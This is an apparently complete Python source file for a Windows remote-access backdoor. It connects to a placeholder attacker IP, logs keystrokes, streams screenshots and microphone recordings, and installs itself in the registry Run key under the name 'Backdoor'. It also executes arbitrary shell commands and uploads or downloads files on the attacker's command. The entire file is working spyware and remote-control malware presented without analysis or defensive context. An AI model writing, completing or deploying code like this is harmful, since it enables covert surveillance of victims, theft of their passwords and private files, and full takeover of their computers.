import socket
import subprocess
import threading
import pynput
import time
import mss
import base64
import os
import winreg
import pyaudio
import wave
import logging

# Configuration
HOST = 'attacker_ip'  # Replace with the attacker's IP address
PORT = 12345  # Choose a port number
INTERVAL = 10  # Keylogger interval in seconds
SCREENSHOT_INTERVAL = 60  # Screenshot interval in seconds
AUDIO_INTERVAL = 60  # Audio recording interval in seconds

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def setup_connection():
    """
    Set up the connection to the attacker.
    """
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST, PORT))
        return client
    except Exception as e:
        logging.error(f"Failed to connect: {e}")
        return None

def on_press(key, keys):
    """
    Keylogger callback function to handle key press events.
    """
    try:
        keys.append(key.char)
    except AttributeError:
        keys.append(str(key))

def on_release(key):
    """
    Keylogger callback function to handle key release events.
    """
    if key == pynput.keyboard.Key.esc:
        return False

def keylogger(keys):
    """
    Start the keylogger thread.
    """
    with pynput.keyboard.Listener(on_press=lambda k: on_press(k, keys), on_release=on_release) as listener:
        listener.join()

def screenshot(client):
    """
    Capture screenshots periodically and send them to the attacker.
    """
    screenshot_count = 0
    with mss.mss() as sct:
        while True:
            try:
                screenshot = sct.grab(sct.monitors[1])
                screenshot_bytes = base64.b64encode(mss.tools.to_png(screenshot.rgb, screenshot.size))
                client.send(f"screenshot_{screenshot_count} {screenshot_bytes.decode('utf-8')}".encode('utf-8'))
                screenshot_count += 1
                time.sleep(SCREENSHOT_INTERVAL)
            except Exception as e:
                logging.error(f"Screenshot capture failed: {e}")

def audio_capture(client):
    """
    Record audio periodically and send the recordings to the attacker.
    """
    audio_count = 0
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = 10

    audio = pyaudio.PyAudio()

    while True:
        try:
            stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = [stream.read(CHUNK) for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS))]
            stream.stop_stream()
            stream.close()

            wf = wave.open(f"audio_{audio_count}.wav", 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

            with open(f"audio_{audio_count}.wav", 'rb') as file:
                audio_data = base64.b64encode(file.read())
                client.send(f"audio_{audio_count} {audio_data.decode('utf-8')}".encode('utf-8'))

            audio_count += 1
            time.sleep(AUDIO_INTERVAL)
        except Exception as e:
            logging.error(f"Audio capture failed: {e}")

def persistence():
    """
    Set a registry key to ensure the backdoor runs automatically on system startup.
    """
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, os.path.abspath(__file__))
        winreg.CloseKey(key)
        logging.info("Persistence established successfully.")
    except Exception as e:
        logging.error(f"Error setting persistence: {e}")

def handle_connection(client, keys):
    """
    Handle incoming commands from the attacker and execute them.
    """
    while True:
        try:
            command = client.recv(1024).decode('utf-8')
            if not command:
                break
            elif command.lower() == 'exit':
                break
            elif command.lower() == 'keys':
                client.send(" ".join(keys).encode('utf-8'))
                keys.clear()
            elif command.lower().startswith('upload'):
                file_path = command.split()[1]
                file_data = client.recv(1024).decode('utf-8')
                with open(file_path, 'wb') as file:
                    file.write(base64.b64decode(file_data))
            elif command.lower().startswith('download'):
                file_path = command.split()[1]
                with open(file_path, 'rb') as file:
                    file_data = base64.b64encode(file.read())
                    client.send(file_data)
            else:
                output = subprocess.check_output(command, shell=True).decode('utf-8')
                client.send(output.encode('utf-8'))
        except Exception as e:
            logging.error(f"Error handling connection: {e}")

def main():
    """
    Main function to set up persistence, start threads, and handle connections.
    """
    persistence()
    client = setup_connection()
    if not client:
        return

    keys = []

    # Start keylogger thread
    threading.Thread(target=keylogger, args=(keys,)).start()

    # Start screenshot thread
    threading.Thread(target=screenshot, args=(client,)).start()

    # Start audio capture thread
    threading.Thread(target=audio_capture, args=(client,)).start()

    # Handle incoming connections
    handle_connection(client, keys)

    # Close the client connection
    client.close()

if __name__ == "__main__":
    main()

